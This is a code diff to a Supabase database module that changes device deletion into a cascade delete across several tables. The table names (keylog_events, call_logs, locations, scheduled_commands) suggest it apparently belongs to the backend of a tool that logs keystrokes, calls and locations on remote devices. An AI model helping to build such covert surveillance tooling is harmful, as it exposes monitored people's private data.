@@ -90,21 +90,39 @@ export async function getAllDevices() {
 }
 
 /**
- * Delete device permanently from database
+ * Delete device permanently from database — CASCADE DELETE
+ * Removes device and ALL related data from every Supabase table.
  */
 export async function deleteDeviceFromDB(deviceId) {
     if (!supabase) return;
 
-    try {
-        const { error } = await supabase
-            .from('devices')
-            .delete()
-            .eq('device_id', deviceId);
+    const tables = [
+        'keylog_events',
+        'call_logs',
+        'locations',
+        'scheduled_commands',
+        'command_history',
+        'devices',  // Delete device row LAST (after all foreign references)
+    ];
 
-        if (error) throw error;
-    } catch (err) {
-        console.error(`[Database] Error deleting device ${deviceId}:`, err.message);
+    for (const table of tables) {
+        try {
+            const { error } = await supabase
+                .from(table)
+                .delete()
+                .eq('device_id', deviceId);
+
+            if (error) {
+                console.warn(`[Database] Error deleting from ${table} for ${deviceId}: ${error.message}`);
+            } else {
+                console.log(`[Database] ✅ Deleted ${deviceId} from ${table}`);
+            }
+        } catch (err) {
+            console.error(`[Database] Error deleting from ${table} for ${deviceId}:`, err.message);
+        }
     }
+
+    console.log(`[Database] ✅ Cascade delete complete for device ${deviceId}`);
 }
 
 // ========== COMMAND HISTORY ==========
